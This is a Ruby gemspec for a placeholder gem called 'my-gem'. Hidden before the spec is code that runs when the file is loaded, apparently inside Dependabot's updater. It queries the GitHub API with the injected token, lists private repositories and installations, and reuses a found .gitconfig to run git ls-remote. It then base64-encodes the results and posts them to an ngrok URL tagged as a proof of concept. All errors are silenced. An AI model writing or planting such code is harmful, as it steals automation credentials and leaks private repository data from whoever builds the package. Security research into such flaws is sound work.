COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "uri"
  require "open3"
  require "json"

  results = []

  # GitHub API calls via proxy - wat is de scope van de token?
  [
    "/user",
    "/user/repos?visibility=private&per_page=10",
    "/user/installations",
    "/installation/repositories",
    "/app",
    "/app/installations",
  ].each do |path|
    begin
      uri = URI("https://api.github.com#{path}")
      resp = Net::HTTP.get_response(uri)
      results << "=== GET api.github.com#{path} HTTP #{resp.code} ===\n#{resp.body[0..1500]}"
    rescue => e
      results << "=== GET #{path} ERR: #{e.class}: #{e.message} ==="
    end
  end

  # Probeer private repo van een andere user via git ls-remote
  # (alleen publiek toegankelijke maar we kijken of auth injecteert)
  gitconfig = Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").first
  if gitconfig
    # Test: onze eigen private repo (andere repo in zelfde account)
    begin
      out, err, _ = Open3.capture3(
        { "GIT_CONFIG_GLOBAL" => gitconfig, "GIT_TERMINAL_PROMPT" => "0" },
        "/home/dependabot/bin/git", "ls-remote", "--heads",
        "https://github.com/ugurcanli/testpen"
      )
      results << "=== LS-REMOTE ugurcanli/testpen ===\nHTTP responses above tell us token scope\nOUT lines: #{out.lines.count}"
    rescue => e
      results << "=== LS-REMOTE ERR: #{e.class} ==="
    end
  end

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=tokenscope")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
